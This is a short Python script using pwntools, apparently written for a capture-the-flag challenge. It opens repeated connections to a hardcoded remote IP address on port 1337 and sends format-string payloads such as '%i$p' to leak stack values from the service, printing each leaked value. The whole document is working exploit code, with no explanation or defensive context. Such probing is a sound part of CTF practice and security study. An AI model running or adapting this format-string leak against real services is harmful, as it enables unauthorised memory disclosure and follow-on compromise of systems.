from pwn import *

def brute_leak_stack():

    for i in range(23):
        io = remote("18.212.136.134", 1337)

        payload = f'%{i}$p'.encode()
        payload = payload.ljust(0x10, b'\x00')

        io.sendlineafter(b'say: ', payload)   

        io.recvuntil(b'Wow: ')

        try:
            leak = io.recvline(timeout=1)
            print(f"[+] {i} => {leak}")
        except:
            continue

        io.close()

brute_leak_stack()